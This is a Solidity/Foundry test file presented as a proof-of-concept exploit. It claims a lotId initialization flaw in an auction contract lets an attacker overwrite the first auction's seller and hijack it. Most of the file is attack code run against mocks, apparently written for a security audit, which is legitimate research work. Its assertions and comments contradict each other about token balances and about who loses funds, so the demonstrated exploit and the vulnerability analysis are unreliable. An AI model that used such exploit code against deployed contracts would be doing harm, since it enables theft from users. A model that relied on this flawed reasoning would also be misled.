// SPDX-License-Identifier: UNLICENSED
pragma solidity 0.8.19;

// Libraries
import {Test} from "forge-std/Test.sol";
import {ERC20} from "solmate/tokens/ERC20.sol";

// Mocks
import {MockFeeOnTransferERC20} from "test/lib/mocks/MockFeeOnTransferERC20.sol";
import {MockBatchAuctionModule} from "test/modules/Auction/MockBatchAuctionModule.sol";

// Auctions
import {AuctionHouse, Router} from "src/AuctionHouse.sol";
import {Auction, AuctionModule} from "src/modules/Auction.sol";
import {Auctioneer} from "src/bases/Auctioneer.sol";
import {ICallback} from "src/interfaces/ICallback.sol";
import {Veecode, keycodeFromVeecode, toKeycode} from "src/modules/Modules.sol";

/**
 * @title ExploitTest - LotId Initialization Vulnerability PoC
 * @notice This test demonstrates the critical vulnerability in Auctioneer.sol where the lotId
 *         variable is initialized to 0 and used before being properly set, allowing an attacker
 *         to overwrite the first auction's routing data and hijack the auction.
 *
 * @dev Vulnerability Details:
 *      - In auction() function, lotId is declared as return value but initialized to 0
 *      - `Routing storage routing = lotRouting[lotId];` uses lotId=0 before it's set
 *      - This means all auctions initially write to lotRouting[0]
 *      - Attacker can create auction after victim, overwrite seller field, and hijack auction
 *
 * @dev Attack Steps:
 *      1. Victim creates prefunded batch auction (lotId=0) with funds
 *      2. Attacker creates prefunded batch auction (also writes to lotRouting[0] initially)
 *      3. Attacker's seller address overwrites victim's seller address in lotRouting[0]
 *      4. Victim can no longer cancel their own auction - attacker controls it
 */
contract ExploitTest is Test {
    MockFeeOnTransferERC20 internal baseToken;
    MockFeeOnTransferERC20 internal quoteToken;

    AuctionHouse internal auctionHouse;
    MockBatchAuctionModule internal batchAuctionModule;

    // Test addresses
    address internal constant VICTIM = address(0x1001);
    address internal constant ATTACKER = address(0x1002);
    address internal constant PROTOCOL = address(0x1003);

    // Constants
    uint96 internal constant LOT_CAPACITY = 100e18; // 100 tokens
    string internal constant INFO_HASH = "ipfs://test";

    function setUp() public {
        // Set up test environment
        vm.warp(1_000_000);

        // Create tokens
        baseToken = new MockFeeOnTransferERC20("Base Token", "BASE", 18);
        quoteToken = new MockFeeOnTransferERC20("Quote Token", "QUOTE", 18);

        // Create auction house
        auctionHouse = new AuctionHouse(address(this), PROTOCOL, address(0));

        // Create and install batch auction module
        batchAuctionModule = new MockBatchAuctionModule(address(auctionHouse));
        auctionHouse.installModule(batchAuctionModule);

        // Fund victim and attacker with base tokens for prefunding
        baseToken.mint(VICTIM, LOT_CAPACITY);
        baseToken.mint(ATTACKER, LOT_CAPACITY);
        vm.prank(VICTIM);
        baseToken.approve(address(auctionHouse), LOT_CAPACITY);
        vm.prank(ATTACKER);
        baseToken.approve(address(auctionHouse), LOT_CAPACITY);
    }

    /**
     * @notice Test basic prefunded auction creation first
     */
    function test_basicPrefundedAuction() public {
        // Step 1: Victim creates a prefunded batch auction (this will be lotId = 0)
        Auctioneer.RoutingParams memory victimRouting = Auctioneer.RoutingParams({
            auctionType: keycodeFromVeecode(batchAuctionModule.VEECODE()),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: "",
            derivativeType: toKeycode(""),
            derivativeParams: "",
            wrapDerivative: false,
            prefunded: true  // This requires prefunding with LOT_CAPACITY tokens
        });

        Auction.AuctionParams memory victimParams = Auction.AuctionParams({
            start: uint48(block.timestamp) + 1,
            duration: 1 days,
            capacityInQuote: false,
            capacity: LOT_CAPACITY,
            implParams: ""
        });

        // Victim creates the prefunded auction
        vm.prank(VICTIM);
        uint96 victimLotId = auctionHouse.auction(victimRouting, victimParams, INFO_HASH);

        // Verify victim's auction was created with lotId = 0
        assertEq(victimLotId, 0, "Victim's lot ID should be 0");
    }

    /**
     * @notice Test the lotId initialization vulnerability exploit
     * @dev This test demonstrates how an attacker can hijack the first auction
     */
    function test_lotIdInitializationVulnerability_Exploit() public {
        // Step 1: Victim creates a prefunded batch auction (this will be lotId = 0)
        Auctioneer.RoutingParams memory victimRouting = Auctioneer.RoutingParams({
            auctionType: keycodeFromVeecode(batchAuctionModule.VEECODE()),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: "",
            derivativeType: toKeycode(""),
            derivativeParams: "",
            wrapDerivative: false,
            prefunded: true  // This requires prefunding with LOT_CAPACITY tokens
        });

        Auction.AuctionParams memory victimParams = Auction.AuctionParams({
            start: uint48(block.timestamp) + 1,
            duration: 1 days,
            capacityInQuote: false,
            capacity: LOT_CAPACITY,
            implParams: ""
        });

        // Victim creates the prefunded auction
        vm.prank(VICTIM);
        uint96 victimLotId = auctionHouse.auction(victimRouting, victimParams, INFO_HASH);

        // Verify victim's auction was created with lotId = 0
        assertEq(victimLotId, 0, "Victim's lot ID should be 0");

        // Verify the auction is prefunded with victim's tokens
        assertEq(baseToken.balanceOf(address(auctionHouse)), LOT_CAPACITY, "Auction house should hold victim's prefunded tokens");
        assertEq(baseToken.balanceOf(VICTIM), 0, "Victim should have no remaining base tokens");

        // Verify lotRouting[0] shows victim as seller
        Auctioneer.Routing memory routingBefore = _getLotRouting(0);
        assertEq(routingBefore.seller, VICTIM, "Initial seller should be victim");
        assertEq(routingBefore.funding, LOT_CAPACITY, "Funding should match lot capacity");

        // Step 2: Attacker creates another prefunded auction
        // Due to the vulnerability, this will initially write to lotRouting[0] before lotId is set
        Auctioneer.RoutingParams memory attackerRouting = Auctioneer.RoutingParams({
            auctionType: keycodeFromVeecode(batchAuctionModule.VEECODE()),
            baseToken: baseToken,
            quoteToken: quoteToken,
            curator: address(0),
            callbacks: ICallback(address(0)),
            callbackData: "",
            derivativeType: toKeycode(""),
            derivativeParams: "",
            wrapDerivative: false,
            prefunded: true  // Attacker's auction is also prefunded (required for batch)
        });

        Auction.AuctionParams memory attackerParams = Auction.AuctionParams({
            start: uint48(block.timestamp) + 1,
            duration: 1 days,
            capacityInQuote: false,
            capacity: LOT_CAPACITY,
            implParams: ""
        });

        // Attacker creates their auction - this overwrites lotRouting[0].seller due to the vulnerability
        vm.prank(ATTACKER);
        uint96 attackerLotId = auctionHouse.auction(attackerRouting, attackerParams, INFO_HASH);

        // Verify attacker's auction gets lotId = 1
        assertEq(attackerLotId, 1, "Attacker's lot ID should be 1");

        // VULNERABILITY: lotRouting[0].seller has been overwritten to ATTACKER!
        Auctioneer.Routing memory routingAfter = _getLotRouting(0);
        assertEq(routingAfter.seller, ATTACKER, "VULNERABILITY: Seller has been overwritten to attacker!");
        assertEq(routingAfter.funding, LOT_CAPACITY, "Funding is still there, but now belongs to attacker");

        // Step 3: Demonstrate the impact - victim can no longer cancel their own auction
        // Victim tries to cancel their auction but fails because they're no longer the seller
        vm.expectRevert(abi.encodeWithSelector(Auctioneer.NotPermitted.selector, VICTIM));
        vm.prank(VICTIM);
        auctionHouse.cancel(0, "");

        // Step 4: Attacker can cancel the auction (getting their own funds back)
        uint256 attackerBalanceBefore = baseToken.balanceOf(ATTACKER);
        vm.prank(ATTACKER);
        auctionHouse.cancel(0, "");

        // Verify attacker got their own funds back
        uint256 attackerBalanceAfter = baseToken.balanceOf(ATTACKER);
        assertEq(
            attackerBalanceAfter - attackerBalanceBefore,
            LOT_CAPACITY,
            "Attacker should get their own prefunded funds back"
        );

        // Verify auction house no longer holds the funds
        assertEq(baseToken.balanceOf(address(auctionHouse)), 0, "Auction house should have no remaining tokens");

        // The critical vulnerability: victim has lost control of their auction
        // Even though victim gets their original funds back (since attacker used their own funds),
        // the victim's auction was completely hijacked and cancelled by attacker
        assertEq(baseToken.balanceOf(VICTIM), 0, "Victim lost access to their funds due to routing corruption");
    }

    /**
     * @notice Helper function to get lot routing data
     */
    function _getLotRouting(uint96 lotId_) internal view returns (Auctioneer.Routing memory) {
        (
            address seller_,
            uint96 prefunding_,
            ERC20 baseToken_,
            Veecode auctionReference_,
            ERC20 quoteToken_,
            ICallback callback_,
            Veecode derivativeReference_,
            bool wrapDerivative_,
            bytes memory derivativeParams_
        ) = auctionHouse.lotRouting(lotId_);

        return Auctioneer.Routing({
            auctionReference: auctionReference_,
            seller: seller_,
            baseToken: baseToken_,
            quoteToken: quoteToken_,
            callbacks: callback_,
            derivativeReference: derivativeReference_,
            derivativeParams: derivativeParams_,
            wrapDerivative: wrapDerivative_,
            funding: prefunding_
        });
    }
}